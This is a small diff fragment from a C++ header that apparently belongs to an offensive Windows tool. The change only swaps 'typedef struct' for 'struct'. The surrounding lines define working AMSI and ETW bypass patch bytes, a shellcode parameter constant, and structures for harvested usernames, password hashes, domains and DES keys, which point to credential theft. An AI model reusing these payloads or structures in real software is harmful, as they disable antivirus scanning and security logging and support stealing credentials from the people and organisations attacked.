@@ -8,13 +8,13 @@ inline std::vector<byte> AMSI_BYPASS_PAYLOAD = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0
 inline std::vector<byte> ETW_BYPASS_PAYLOAD = { 0xC3 };
 constexpr SIZE_T MAX_SHELLCODE_PARAMETERS = 3;
 
-typedef struct Credential {
+struct Credential {
 	std::wstring Username;
 	std::wstring EncryptedHash;
 	std::wstring Domain;
 };
 
-typedef struct CredentialsInformation {
+struct CredentialsInformation {
 	std::vector<UCHAR> DesKey;
 	std::vector<UCHAR> Iv;
 	std::vector<Credential> Credentials;
